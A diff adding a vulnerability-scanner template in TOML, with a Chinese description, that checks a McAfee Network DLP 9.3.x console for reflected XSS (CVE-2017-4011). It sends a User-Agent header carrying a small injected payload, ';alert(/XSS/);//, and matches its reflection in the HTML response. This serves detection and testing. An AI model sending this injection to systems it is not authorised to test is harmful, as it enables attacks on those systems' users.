@@ -1,0 +1,43 @@
+[info]
+author = "AVE"
+description = "通过向 McAfee NDLP 管理控制台发送包含恶意 User-Agent 头的 HTTP 请求，检测是否存在反射型 XSS 漏洞。若服务器将 User-Agent 内容反射回响应页面且未正确编码，则判定存在漏洞。"
+id = "POC-AVE-2017-0114"
+name = "McAfee Network Data Loss Prevention 9.3.x User-Agent XSS PoC"
+severity = "medium"
+tags = [
+    "cve-2017-4011",
+    "mcafee",
+    "xss",
+    "ndlp",
+]
+vuln_id = [
+    "CVE-2017-4011",
+    "AVE-2017-0114",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1';alert(/XSS/);//"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["var ua='Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1';alert(/XSS/);//"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["text/html"]
